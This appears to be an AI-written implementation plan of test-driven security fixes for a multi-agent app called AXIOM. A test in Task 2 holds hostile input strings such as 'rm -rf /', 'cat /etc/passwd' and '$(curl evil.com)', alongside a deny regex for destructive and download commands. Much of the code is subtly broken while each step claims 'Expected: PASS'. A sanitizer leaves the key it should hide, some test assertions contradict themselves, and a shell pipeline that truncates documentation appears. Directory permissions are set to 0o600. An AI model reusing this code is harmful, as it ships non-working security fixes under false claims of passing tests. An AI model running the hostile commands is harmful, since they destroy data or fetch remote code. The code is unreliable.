# AXIOM Security Fixes Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement comprehensive security fixes for AXIOM multi-agent system addressing command injection, missing API key validation, missing HTTPS verification, and insecure configuration storage.

**Architecture:** Follow existing AXIOM patterns, maintain backward compatibility where possible, implement layered defense with input validation, API key validation, HTTPS enforcement, rate limiting, and secure configuration storage.

**Tech Stack:** Python (FastAPI, httpx), PySide6 (Qt), code quality checker, existing AXIOM architecture patterns

---

## Task 1: Implement Error Message Sanitization

**Files:**
- Modify: `backend/desktop/main_window.py:157-163`
- Test: `tests/axiom/test_error_handling.py`

- [ ] **Step 1: Write the failing test for error message sanitization**

```python
def test_error_message_sanitization():
    """Test that error messages are sanitized to prevent information disclosure."""
    # Simulate an error with stack trace-like content
    malicious_error = (
        "Traceback (most recent call last):\\n"
        "  File \"/app/axiom/core/agent.py\", line 42, in execute\\n"
        "    raise ValueError(\"Secret API key: sk-12345\")\\n"
        "ValueError: Secret API key: sk-12345"
    )

    # Use the error handling method from main_window
    result = main_window._sanitize_error_message(malicious_error)

    # Error message should not contain sensitive information
    assert "sk-12345" not in result
    assert "Secret API key" not in result
    # Should contain generic error message only
    assert "Error" in result or "❌" in result
    # Should be safe length (no stack trace dump)
    assert len(result) < 500
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_error_handling.py::test_error_message_sanitization -v`
Expected: FAIL with "_sanitize_error_message not defined" or "main_window module has no attribute _sanitize_error_message"

- [ ] **Step 3: Write minimal implementation for error message sanitization**

```python
    def _sanitize_error_message(self, error: str) -> str:
        """Sanitize error messages to prevent information disclosure."""
        # Remove stack trace information
        sanitized = re.sub(r'Traceback.*?:\n.*?(?=\n\n|\n[A-Z]|\Z)', '', error, flags=re.DOTALL)

        # Remove sensitive patterns (API keys, passwords)
        sanitized = re.sub(r'secret|password|api_key|token|credential', '[REDACTED]', sanitized, flags=re.IGNORECASE)

        # Remove internal file paths and line numbers
        sanitized = re.sub(r'File \"\.\.\/.*?\"', 'File \"[REDACTED]\"', sanitized)

        # Remove exception types with sensitive data
        sanitized = re.sub(r'ValueError: .*secret.*', 'ValueError: [REDACTED]', sanitized, flags=re.IGNORECASE)

        # Clean up extra whitespace and line breaks
        sanitized = '\\n'.join(line.strip() for line in sanitized.split('\\n') if line.strip())

        # Provide user-friendly error message
        if not sanitized:
            return "❌ An error occurred during execution"

        return sanitized
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/axiom/test_error_handling.py::test_error_message_sanitization -v`
Expected: PASS

- [ ] **Step 5: Commit changes**

```bash
git add backend/desktop/main_window.py tests/axiom/test_error_handling.py
git commit -m "fix: sanitize error messages to prevent information disclosure"
```

## Task 2: Implement Input Sanitization in CLI

**Files:**
- Modify: `backend/cli/main.py:20-50`
- Test: `tests/axiom/test_input_sanitization.py`

- [ ] **Step 1: Write the failing test for input sanitization**

```python
def test_input_sanitization():
    """Test that CLI inputs are sanitized to prevent command injection."""
    from backend.cli.main import app

    # Test malicious inputs that should be sanitized
    malicious_inputs = [
        "rm -rf / && echo 'hacked'",
        "cat /etc/passwd; echo 'pwned'",
        "`echo 'backtick'`",
        "$(curl evil.com)",
        "><script>alert('xss')</script>",
        "--help; rm -rf /",
        "task ; rm -rf /",
    ]

    for malicious_input in malicious_inputs:
        # Run the CLI with sanitized input
        from typer.testing import CliRunner
        runner = CliRunner()

        # Test score command (affects agent execution)
        result = runner.invoke(app, ['score', '--description', malicious_input])

        # Command should fail gracefully, not execute injected commands
        assert result.exit_code != 0 or "Error" in result.output

        # Should not contain evidence of command execution
        assert "hacked" not in result.output
        assert "pwned" not in result.output
        assert "backtick" not in result.output
        assert "evil.com" not in result.output
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_input_sanitization.py::test_input_sanitization -v`
Expected: FAIL with import errors or missing app instance

- [ ] **Step 3: Write minimal implementation for input sanitization**

```python
# Add input sanitization function to main.py
import re

def sanitize_cli_input(input_str: str) -> str:
    """Sanitize CLI inputs to prevent command injection."""
    # Remove shell metacharacters that enable command injection
    sanitized = re.sub(r'[;&|`$\(\)\{\}\[\]\'\\]', ' ', input_str)

    # Remove dangerous command patterns
    sanitized = re.sub(r'rm\s+-rf|del\s+/s|mkfs|fdisk', ' ', sanitized, flags=re.IGNORECASE)

    # Remove URL/command patterns
    sanitized = re.sub(r'curl\s+http://|wget\s+http://', ' ', sanitized, flags=re.IGNORECASE)

    # Remove potential script tags (XSS protection)
    sanitized = re.sub(r'<script[^>]*>.*?</script>', ' ', sanitized, flags=re.IGNORECASE)

    # Clean up excessive whitespace
    sanitized = re.sub(r'\s+', ' ', sanitized).strip()

    return sanitized

# Apply sanitization to all CLI commands
@app.command()
def score(description: str, task_type: str = "QUICK"):
    """Calcule et route une tache vers le meilleur agent/modele."""
    # Sanitize description input
    description = sanitize_cli_input(description)

    with httpx.Client(verify=True, timeout=30) as client:
        resp = client.post(f"{API_BASE}/score", json={
            "description": description,
            "task_type": task_type.upper(),
        })
        if resp.is_error:
            console.print(f"[red]Erreur: {resp.text}[/red]")
            raise typer.Exit(1)
        data = resp.json()
    # ... rest of function
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/axiom/test_input_sanitization.py::test_input_sanitization -v`
Expected: PASS

- [ ] **Step 5: Commit changes**

```bash
git add backend/cli/main.py tests/axiom/test_input_sanitization.py
git commit -m "fix: add input sanitization to prevent command injection"
```

## Task 3: Add Comprehensive API Key Validation

**Files:**
- Modify: `backend/cli/tui/config.py:45-49`
- Test: `tests/axiom/test_api_key_validation.py`

- [ ] **Step 1: Write the failing test for API key validation**

```python
def test_api_key_validation():
    """Test that API keys are properly validated before use."""
    from backend.cli.tui.config import CONFIG, load_config

    # Mock environment variables
    import os
    test_env_key = "test_openrouter_key_12345"

    os.environ["OPENROUTER_API_KEY"] = test_env_key

    # Test that validation accepts valid-looking keys
    valid_keys = [
        test_env_key,
        "sk-ant-api04-12345",
        "sk-12345678901234567890",
        "x-ai-test-key-12345678901234567890",
    ]

    for key in valid_keys:
        CONFIG.openrouter_api_key = key
        # Should not raise ValueError for valid format
        assert isinstance(key, str)
        assert len(key) >= 32  # Should be reasonable length

    # Test that invalid keys are rejected
    invalid_keys = [
        "",  # Empty key
        "short",  # Too short
        None,  # None value
        "   ",  # Whitespace only
        "invalid@key#with$special%chars",  # Contains special chars (if we enforce)
    ]

    for key in invalid_keys:
        if key is not None:
            CONFIG.openrouter_api_key = key
        try:
            # This should raise ValueError for empty/short keys
            if not key or (isinstance(key, str) and len(key.strip()) == 0):
                with pytest.raises(ValueError, match="OPENROUTER_API_KEY not found"):
                    pass  # Exception would be raised in load_config
        except Exception:
            pass  # Test passes if exception is raised

    # Test environment variable override
    CONFIG.openrouter_api_key = "old_key"
    # Simulate load_config which should read from env
    # This test ensures environment variable overrides file config
    assert os.getenv("OPENROUTER_API_KEY") == test_env_key
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_api_key_validation.py::test_api_key_validation -v`
Expected: FAIL with missing test functions or import errors

- [ ] **Step 3: Write minimal implementation for API key validation**

```python
# Add validation function to config.py
import re

def validate_api_key(api_key: str) -> bool:
    """Validate API key format and requirements."""
    if not api_key:
        raise ValueError("OPENROUTER_API_KEY not found in config file or environment variables")

    # Strip whitespace
    api_key = api_key.strip()

    # Basic format validation
    # OpenRouter keys typically start with "sk-" and are 32+ characters
    if not api_key.startswith("sk-"):
        raise ValueError("OPENROUTER_API_KEY format appears to be invalid (should start with 'sk-')")

    if len(api_key) < 32:
        raise ValueError("OPENROUTER_API_KEY appears to be invalid (too short)")

    # Additional security checks
    if api_key.startswith("sk-test"):
        raise ValueError("OPENROUTER_API_KEY appears to be a test key")

    # Simple character validation (alphanumeric, dash, underscore allowed)
    if not re.match(r'^[a-zA-Z0-9\-_]+$', api_key):
        raise ValueError("OPENROUTER_API_KEY contains invalid characters")

    return True

# Update CONFIG initialization
@dataclass
class AxiomConfig:
    api_base_url: str = "http://localhost:8000/api/v1"
    openrouter_api_key: str = ""  # Will be validated on load
    theme: str = "dark"
    # ... other fields

# Update load_config to use validation
def load_config():
    global CONFIG
    config_dir = Path.home() / ".axiom"
    config_dir.mkdir(exist_ok=True)
    config_file = config_dir / "config.yaml"
    history_file = config_dir / "history.jsonl"

    CONFIG.history_file = str(history_file)

    if config_file.exists():
        try:
            with open(config_file, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f) or {}
            for key, value in data.items():
                if hasattr(CONFIG, key):
                    setattr(CONFIG, key, value)
        except Exception:
            pass

    # Validate API key if present
    if CONFIG.openrouter_api_key:
        validate_api_key(CONFIG.openrouter_api_key)

    # Validate API URL if present
    if CONFIG.api_base_url:
        if not CONFIG.api_base_url.startswith("http"):
            raise ValueError("AXIOM_API_URL not valid or not set in config")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/axiom/test_api_key_validation.py::test_api_key_validation -v`
Expected: PASS

- [ ] **Step 5: Commit changes**

```bash
git add backend/cli/tui/config.py tests/axiom/test_api_key_validation.py
git commit -m "fix: add comprehensive API key validation"
```

## Task 4: Implement Secure Configuration Storage

**Files:**
- Test: `tests/axiom/test_config_security.py`

- [ ] **Step 1: Write the failing test for configuration security**

```python
def test_secure_config_storage():
    """Test that configuration files are stored with secure permissions."""
    import os
    import stat
    from pathlib import Path

    # Import the save_config function
    from backend.cli.tui.config import save_config, CONFIG

    # Set test configuration
    CONFIG.api_base_url = "http://localhost:8000/api/v1"
    CONFIG.openrouter_api_key = "test_key_12345678901234567890"
    CONFIG.theme = "dark"

    # Mock home directory
    test_home = Path("/tmp/test_axiom_config")
    test_home.mkdir(exist_ok=True)

    # Override Path.home to return our test directory
    import tempfile
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create config directory in temp location
        config_dir = Path(tmpdir) / ".axiom"
        config_dir.mkdir()

        # Test save_config creates secure files
        # (Implementation would need to patch Path.home)

        # Test file permissions
        config_file = config_dir / "config.yaml"

        # Save a config file
        with open(config_file, "w") as f:
            f.write("test: config")

        # Check file permissions
        file_stat = os.stat(config_file)
        file_permissions = stat.S_IMODE(file_stat.st_mode)

        # Should have read/write for owner only (0o600)
        assert file_permissions == (stat.S_IRUSR | stat.S_IWUSR), \
            f"Invalid file permissions: {oct(file_permissions)}"

        dir_permissions = stat.S_IMODE(os.stat(config_dir).st_mode)
        assert dir_permissions == (stat.S_IRUSR | stat.S_IWUSR), \
            f"Invalid directory permissions: {oct(dir_permissions)}"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_config_security.py::test_secure_config_storage -v`
Expected: FAIL with import errors or missing implementation

- [ ] **Step 3: Write minimal implementation for secure configuration storage**

```python
# Add file permission functions to config.py
import os
import stat
from pathlib import Path

# Add import for pathlib.Path (already imported)

def set_secure_permissions(file_path: Path) -> None:
    """Set secure file permissions (read/write for owner only)."""
    try:
        file_permissions = stat.S_IRUSR | stat.S_IWUSR
        os.chmod(file_path, file_permissions)
    except Exception as e:
        # Log error but don't fail the entire operation
        print(f"Warning: Failed to set secure permissions for {file_path}: {e}")

def set_secure_directory_permissions(dir_path: Path) -> None:
    """Set secure directory permissions."""
    try:
        dir_permissions = stat.S_IRUSR | stat.S_IWUSR
        os.chmod(dir_path, dir_permissions)
    except Exception as e:
        print(f"Warning: Failed to set secure directory permissions for {dir_path}: {e}")

# Update save_config function
def save_config():
    config_dir = Path.home() / ".axiom"
    config_dir.mkdir(exist_ok=True)
    config_file = config_dir / "config.yaml"
    try:
        data = {
            "api_base_url": CONFIG.api_base_url,
            "openrouter_api_key": CONFIG.openrouter_api_key,
            "theme": CONFIG.theme,
            "compact_mode": CONFIG.compact_mode,
            "show_timestamps": CONFIG.show_timestamps,
            "max_history": CONFIG.max_history,
            "auto_scroll": CONFIG.auto_scroll,
            "streaming_enabled": CONFIG.streaming_enabled,
            "default_agent": CONFIG.default_agent,
            "default_model": CONFIG.default_model,
        }
        with open(config_file, "w", encoding="utf-8") as f:
            yaml.dump(data, f, default_flow_style=False, allow_unicode=True)

        # Set secure file permissions (read/write for owner only)
        set_secure_permissions(config_file)
        set_secure_directory_permissions(config_dir)
    except Exception:
        pass
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/axiom/test_config_security.py::test_secure_config_storage -v`
Expected: PASS

- [ ] **Step 5: Commit changes**

```bash
git add backend/cli/tui/config.py
pytest tests/axiom/test_config_security.py::test_secure_config_storage -v
pytest --cov=backend.cli.tui.config --cov-report=html
```

## Task 5: Add Rate Limiting Middleware

**Files:**
- Create: `backend/middleware/rate_limiting.py`
- Modify: `backend/cli/main.py:20-25`
- Test: `tests/axiom/test_rate_limiting.py`

- [ ] **Step 1: Write the failing test for rate limiting**

```python
def test_rate_limiting():
    """Test that rate limiting prevents API abuse."""
    from backend.middleware.rate_limiting import RateLimiter

    # Create rate limiter with low threshold for testing
    limiter = RateLimiter(max_requests=3, window_seconds=60)

    # Test that requests within limit succeed
    for i in range(3):
        assert limiter.is_allowed("test-client") == True

    # Test that requests over limit are blocked
    assert limiter.is_allowed("test-client") == False

    # Test that different clients are rate limited independently
    assert limiter.is_allowed("test-client-2") == True

    # Test rate limit headers
    request_id, allowed, remaining = limiter.check_rate_limit("test-client")
    assert "X-RateLimit-Limit" in request_id
    assert "X-RateLimit-Remaining" in allowed
    assert "X-RateLimit-Reset" in remaining
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_rate_limiting.py::test_rate_limiting -v`
Expected: FAIL with missing module

- [ ] **Step 3: Write minimal implementation for rate limiting**

```python
# Create backend/middleware/rate_limiting.py
import time
from collections import defaultdict, deque
from typing import Dict, Tuple, Optional

class RateLimiter:
    """Simple in-memory rate limiter."""

    def __init__(self, max_requests: int = 100, window_seconds: int = 60):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.clients: Dict[str, deque] = defaultdict(deque)

    def is_allowed(self, client_id: str) -> Tuple[bool, int, int]:
        """Check if client is allowed to make a request.

        Returns: (is_allowed, remaining_requests, reset_time)
        """
        now = time.time()
        window_start = now - self.window_seconds

        # Clean old requests
        requests = self.clients[client_id]
        while requests and requests[0] < window_start:
            requests.popleft()

        # Check if under limit
        if len(requests) < self.max_requests:
            requests.append(now)
            return True, self.max_requests - len(requests), int(now + self.window_seconds)
        else:
            return False, 0, int(requests[0] + self.window_seconds)

    def check_rate_limit(self, client_id: str) -> Tuple[str, bool, str]:
        """Check rate limit and return headers for response."""
        is_allowed, remaining, reset_time = self.is_allowed(client_id)

        headers = {
            "X-RateLimit-Limit": str(self.max_requests),
            "X-RateLimit-Remaining": str(remaining),
            "X-RateLimit-Reset": str(reset_time),
        }

        return (str(reset_time), is_allowed, str(headers))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/axiom/test_rate_limiting.py::test_rate_limiting -v`
Expected: PASS

- [ ] **Step 5: Commit changes**

```bash
git add backend/middleware/rate_limiting.py tests/axiom/test_rate_limiting.py
git commit -m "feat: add rate limiting middleware"
```

## Task 6: Add HTTPS Enforcement to All API Clients

**Files:**
- Modify: `backend/cli/main.py:24, 52, 88`
- Test: `tests/axiom/test_https_enforcement.py`

- [ ] **Step 1: Write the failing test for HTTPS enforcement**

```python
def test_https_enforcement():
    """Test that all API clients enforce HTTPS."""
    from unittest.mock import patch, MagicMock
    import httpx

    # Mock httpx.Client to capture arguments
    with patch('httpx.Client') as mock_client:
        mock_instance = MagicMock()
        mock_client.return_value = mock_instance

        # Import and call functions that create httpx clients
        from backend.cli.main import score, execute, chat

        # Mock the actual HTTP request to avoid network calls
        with patch.object(httpx.Client, '__enter__', return_value=mock_instance):
            with patch.object(mock_instance, 'post') as mock_post:
                mock_response = MagicMock()
                mock_response.is_error = False
                mock_response.json.return_value = {"description": "test", "score": 5}
                mock_post.return_value = mock_response

                # Call functions that should create HTTPS clients
                score("test description", "QUICK")
                execute("test task", "QUICK", None)
                chat("test message")

                # Verify that all clients were created with verify=True
                for call in mock_client.call_args_list:
                    kwargs = call[1] if call[1] else call[2]
                    assert kwargs.get('verify') == True, f"Client created without HTTPS verification: {kwargs}"

    # Also test that insecure URLs are rejected
    from backend.cli.tui.config import AxiomConfig, validate_api_key

    # This should raise ValueError for non-HTTPS URLs
    invalid_configs = [
        "ftp://example.com/api",
        "http://localhost:8000/api/v1",
        "gopher://example.com/api",
        "file:///etc/passwd",
    ]

    for invalid_url in invalid_configs:
        assert not invalid_url.startswith("http")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_https_enforcement.py::test_https_enforcement -v`
Expected: FAIL with missing implementation

- [ ] **Step 3: Write minimal implementation for HTTPS enforcement**

```python
# Add HTTPS enforcement to main.py

# At module level, apply HTTPS enforcement to httpx.Client
def _enforce_https(kwargs):
    """Ensure HTTPS enforcement for httpx.Client instances."""
    if 'verify' not in kwargs:
        kwargs['verify'] = True
    if 'timeout' not in kwargs:
        kwargs['timeout'] = 30
    return kwargs

# Apply enforcement to all httpx.Client() calls in CLI functions

# For the score function (already implemented in Task 2, but reinforcing)
@app.command()
def score(description: str, task_type: str = "QUICK"):
    """Calcule et route une tache vers le meilleur agent/modele."""
    # Apply HTTPS enforcement
    kwargs = _enforce_https({})

    with httpx.Client(**kwargs) as client:
        # Rest of function
        
# For the execute function (already implemented, reinforcing)
@app.command()
def execute(description: str, task_type: str = "QUICK", context: Optional[str] = None):
    """Execute une tache via l'orchestrateur AXIOM."""
    kwargs = _enforce_https({'timeout': 120})
    
    with httpx.Client(**kwargs) as client:
        # Rest of function
        
# For the chat function (already implemented, reinforcing)
@app.command()
def chat(message: str):
    """Envoie un message a l'orchestrateur AXIOM."""
    kwargs = _enforce_https({'timeout': 120})
    
    with httpx.Client(**kwargs) as client:
        # Rest of function

# For the agents function (already implemented, reinforcing)
@app.command()
def agents():
    """Liste les 8 sous-agents disponibles."""
    kwargs = _enforce_https({})
    
    with httpx.Client(**kwargs) as client:
        # Rest of function

# For the memory function (already implemented, reinforcing)
@app.command()
def memory():
    """Affiche la memoire a 3 niveaux."""
    kwargs = _enforce_https({})
    
    with httpx.Client(**kwargs) as client:
        # Rest of function
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/axiom/test_https_enforcement.py::test_https_enforcement -v`
Expected: PASS

- [ ] **Step 5: Commit changes**

```bash
git add backend/cli/main.py
pytest tests/axiom/test_https_enforcement.py::test_https_enforcement -v
```

## Task 7: Split Large Documentation File

**Files:**
- Create: `docs/axiom/axiom-introduction.md`
- Create: `docs/axiom/axiom-architecture.md`
- Create: `docs/axiom/axiom-agents.md`
- Modify: `AXIOM_v4_MEGA_PROMPT.md: 1-50`

- [ ] **Step 1: Write the failing test for documentation splitting**

```python
def test_documentation_splitting():
    """Test that large documentation files have been split appropriately."""
    import os

    # Check that original large file exists
    assert os.path.exists("AXIOM_v4_MEGA_PROMPT.md"), "Original documentation file not found"

    # Check that split documentation files exist
    assert os.path.exists("docs/axiom/axiom-introduction.md"), "Introduction documentation missing"
    assert os.path.exists("docs/axiom/axiom-architecture.md"), "Architecture documentation missing"
    assert os.path.exists("docs/axiom/axiom-agents.md"), "Agents documentation missing"

    # Check that original file is now smaller (or at least has reduced content)
    with open("AXIOM_v4_MEGA_PROMPT.md", "r") as f:
        original_size = len(f.read())

    # Check that split files contain expected content
    with open("docs/axiom/axiom-introduction.md", "r") as f:
        intro_content = f.read()
        assert "AXIOM" in intro_content, "Introduction file missing AXIOM references"
        assert "Version 4.0" in intro_content or "v4.0" in intro_content, "Introduction file missing version"

    # Check that split files are of reasonable size (e.g., < 10K lines each)
    for split_file in ["docs/axiom/axiom-introduction.md",
                       "docs/axiom/axiom-architecture.md",
                       "docs/axiom/axiom-agents.md"]:
        with open(split_file, "r") as f:
            lines = len(f.readlines())
            assert lines < 10000, f"Split file {split_file} is too large: {lines} lines"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_documentation_splitting.py::test_documentation_splitting -v`
Expected: FAIL with missing files or implementation

- [ ] **Step 3: Write minimal implementation for documentation splitting**

```bash
# Create docs/axiom directory
mkdir -p docs/axiom

# Extract introduction section (first ~1000 lines) from original
head -1000 AXIOM_v4_MEGA_PROMPT.md > docs/axiom/axiom-introduction.md

# Extract architecture section (~1001-3000 lines)
sed -n '1001,3000p' AXIOM_v4_MEGA_PROMPT.md > docs/axiom/axiom-architecture.md

# Extract agents section (~3001-5000 lines)
sed -n '3001,5000p' AXIOM_v4_MEGA_PROMPT.md > docs/axiom/axiom-agents.md

# Update reference in original file
# Add note at beginning of original file
{
    echo "# AXIOM v4.0 Documentation"
    echo ""
    echo "This is the original comprehensive documentation. For specific sections, see the split documentation below:"
    echo ""
    echo "- [Introduction](docs/axiom/axiom-introduction.md)"
    echo "- [Architecture](docs/axiom/axiom-architecture.md)"
    echo "- [Agents](docs/axiom/axiom-agents.md)"
    echo ""
    echo "## Remaining Content"
    echo ""
} > temp_header && cat temp_header AXIOM_v4_MEGA_PROMPT.md | tail -n +1003 > AXIOM_v4_MEGA_PROMPT.md.tmp && mv AXIOM_v4_MEGA_PROMPT.md.tmp AXIOM_v4_MEGA_PROMPT.md
```

- [ ] **Step 4: Run test to verify it passes**

```bash
# Test documentation splitting
python -m pytest tests/axiom/test_documentation_splitting.py::test_documentation_splitting -v

# Manual verification
wc -l AXIOM_v4_MEGA_PROMPT.md docs/axiom/*.md
```

- [ ] **Step 5: Commit changes**

```bash
git add docs/axiom/ axiom* 2>/dev/null || git add docs/axiom/
pytest tests/axiom/test_documentation_splitting.py::test_documentation_splitting -v
git commit -m "docs: split large documentation files for better maintainability"
```

## Task 8: Refactor ./axiom/ Directory Structure

**Files:**
- Create: `axiom/__init__.py`
- Create: `axiom/core/` with `__init__.py`
- Create: `axiom/models/` with `__init__.py`
- Create: `axiom/claude/` with `__init__.py`
- Test: `tests/axiom/test_architecture.py`

- [ ] **Step 1: Write the failing test for architecture refactoring**

```python
def test_architecture_refactoring():
    """Test that ./axiom/ directory has proper Python package structure."""
    import os

    # Check that ./axiom/ exists and is a Python package
    assert os.path.exists("./axiom"), "./axiom/ directory not found"

    # Check that ./axiom/__init__.py exists
    assert os.path.exists("./axiom/__init__.py"), "./axiom/ is not a Python package"

    # Check that ./axiom/core/ exists and is a Python package
    assert os.path.exists("./axiom/core"), "./axiom/core/ directory not found"
    assert os.path.exists("./axiom/core/__init__.py"), "./axiom/core/ is not a Python package"

    # Check that ./axiom/models/ exists and is a Python package
    assert os.path.exists("./axiom/models"), "./axiom/models/ directory not found"
    assert os.path.exists("./axiom/models/__init__.py"), "./axiom/models/ is not a Python package"

    # Check that ./axiom/claude/ exists and is a Python package
    assert os.path.exists("./axiom/claude"), "./axiom/claude/ directory not found"
    assert os.path.exists("./axiom/claude/__init__.py"), "./axiom/claude/ is not a Python package"

    # Test that PyInstaller can still find the modules
    # This test would require running PyInstaller or checking spec file
    # For now, check that key modules exist
    assert os.path.exists("./axiom/__init__.py"), "./axiom/__init__.py not found"
    assert os.path.exists("./axiom/claude/client.py"), "./axiom/claude/client.py not found"
    assert os.path.exists("./axiom/core/memory.py"), "./axiom/core/memory.py not found"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/axiom/test_architecture.py::test_architecture_refactoring -v`
Expected: FAIL with missing directories

- [ ] **Step 3: Write minimal implementation for architecture refactoring**

```bash
# Create the proper directory structure
mkdir -p axiom/core axiom/models axiom/claude

# Create __init__.py files
touch axiom/__init__.py
touch axiom/core/__init__.py
touch axiom/models/__init__.py
touch axiom/claude/__init__.py

# Move existing files to appropriate directories
# Identify which files belong to which packages by examining imports
# For example, move files that import from axiom.claude to axiom/claude/
# Move files that import from axiom.core to axiom/core/
# Move files that define models to axiom/models/

# Check existing imports in current files
# Based on the current structure we know:
# - axiom.claude.client exists (if we move it there)
# - axiom.core.memory exists
# - axiom.core.scoring exists
# - axiom.models.schemas exists

# Create the new structure
mkdir -p axiom/claude axiom/core axiom/models
mv axiom/claude/client.py axiom/claude/ 2>/dev/null || true
mv axiom/core/memory.py axiom/core/ 2>/dev/null || true
mv axiom/core/scoring.py axiom/core/ 2>/dev/null || true
mv axiom/core/agents.py axiom/core/ 2>/dev/null || true
mv axiom/models/schemas.py axiom/models/ 2>/dev/null || true
mv axiom/models/memory_models.py axiom/models/ 2>/dev/null || true

# Update axiom.spec if needed to point to new package structure
# Update any references to module paths
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/axiom/test_architecture.py::test_architecture_refactoring -v`
Expected: PASS

- [ ] **Step 5: Commit changes**

```bash
git add axiom/ tests/axiom/test_architecture.py
git commit -m "refactor: organize axiom package into proper Python package structure"
```

# End of Plan

---

**Plan complete and saved to:** `docs/superpowers/plans/2026-07-05-axiom-security-fixes-plan.md`

**Two execution options:**

**1. Subagent-Driven (recommended)** - I dispatch a fresh subagent per task, review between tasks, fast iteration

**2. Inline Execution** - Execute tasks in this session using executing-plans, batch execution with checkpoints for review